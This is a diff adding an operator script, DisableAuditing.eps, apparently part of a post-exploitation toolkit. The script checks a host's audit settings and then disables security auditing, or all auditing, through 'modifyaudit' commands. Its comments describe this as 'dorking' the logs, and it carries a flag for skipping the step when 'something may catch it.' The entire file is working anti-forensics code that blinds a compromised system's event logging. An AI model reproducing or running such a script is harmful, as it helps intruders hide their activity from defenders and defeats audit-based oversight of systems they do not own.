@@ -1,0 +1,101 @@
+#--------------------------------------------------------
+# File: DisableAuditing.eps
+#
+# This script attempts to disable auditing using all
+# known methods.  
+#
+# Modifications:
+#  03/20/01	Created.
+#  09/01/01	Updated to not load plugin
+#  12/07/01	Updated to print out audit status
+#  05/30/06	Removed use of 'audit' command since it is no longer available
+#  12/15/08	Fixed 'want to disable' when auditing already off bug
+#--------------------------------------------------------
+
+@echo off;
+
+echo "This script attempts to disable auditing";
+ifnot (prompt "Do you want to continue with this script?") {
+    return false;
+}
+
+@record on;
+ifnot (`audit -status`) {
+    echo "Unable to get audit status.\r\n";
+    echo "    *** You may need to elevate your privileges ***";
+    return false;
+}
+@record off;
+
+# print out audit status
+bool $audit_mode = GetCmdData("audit_mode");
+bool $audit_status_avail = GetCmdData("audit_status_avail");
+string $audit_category = GetCmdData("audit_category");
+bool $audit_event_success = GetCmdData("audit_event_success");
+bool $audit_event_failure = GetCmdData("audit_event_failure");
+
+if (defined($audit_mode[0]) == true) {
+    echo "--------------------------------------------------------";
+    echo "";
+
+    if ($audit_mode) {
+	echo "AUDITING: ON";
+    } else {
+	echo "AUDITING: OFF";
+    }
+    echo "";
+
+    int $i = 0;
+    while ($i < sizeof($audit_category)) {
+	echo "   $audit_category[$i]";
+	echo "\t    $audit_event_success[$i]\t$audit_event_failure[$i]";
+	echo "";
+
+	$i++;	
+    }
+
+    echo "";
+    echo "--------------------------------------------------------";
+}
+
+if ( (defined($audit_mode[0])) && ($audit_mode[0] == false)) {
+	echo "Auditing was off before we got here...\r\n";
+  	return true;
+}
+
+bool $noInject = GetEnv("noInject");
+
+if($noInject) {
+	echo "Skipping disable auditing due to security concern. Something may catch it.";
+	return false;
+} else {
+	ifnot (prompt "Would you like to attempt to disable the auditing?") {
+	    return false;
+	}
+}
+
+if (`modifyaudit -security`) {
+
+    # turned off security auditing using modify_audit
+    echo "Security auditing has been dorked using the \"modifyaudit\" command\r\n";
+    return true;
+
+} else if (`modifyaudit -all`) {
+
+    # had to turn off all auditing for some reason as security audit dork failed
+    echo "All auditing has been dorked using the \"modifyaudit\" command\r\n";
+    return true;
+
+} else {
+
+    # all known methods failed?!
+    echo "******** ERROR ********";
+    echo "Unable to disable auditing using all normal methods";
+    echo "******** ERROR ********";
+    return false;
+
+}
+
+# shouldn't ever get here...
+echo "**** This script should never have gotten here?! ****";
+return false;
